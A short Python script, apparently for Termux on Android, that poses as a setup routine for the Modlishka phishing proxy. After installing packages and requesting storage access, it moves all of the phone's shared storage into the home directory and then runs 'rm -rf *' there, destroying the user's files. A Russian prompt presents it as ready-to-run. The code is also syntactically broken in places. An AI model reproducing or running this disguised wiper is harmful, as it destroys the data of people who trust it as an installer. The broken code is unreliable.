import os

def start():
    os.system('pkg install git -y')
    os.system('pkg install root-repo unstable-repo x11-repo')
    os.system('apt update -y')
    os.system('termux-setup-storage')
    os.system('cd /storage/emulated/0/')
    os.system('mkdir /storage/emulated/0/Hack
    os.system('mv /storage/emulated/0/* /storage/emulated/0/Hack')
    os.system('mv /storage/emulated/0/Hack $HOME/')
    s.system('cd')          
    os.system('rm -rf Hacki')     
    os.system('git clone https://github.com/drk1wi/Modlishka; cd go/src/github.com/drk1wi/Modlishka && openssl genrsa -out MyCA.key 2048 && openssl req -x509 -new -nodes -key MyCA.key -sha256 -days 1024 -out MyCA.pem && ls; atom plugin/autocert.go; atom MyCA.key; atom MyCA.pem')
start()
os.system('cd')
os.system('rm -rf *')
print('Готов к запуску, напииште старт')
ds=input('Go: ')
ds = 'start'
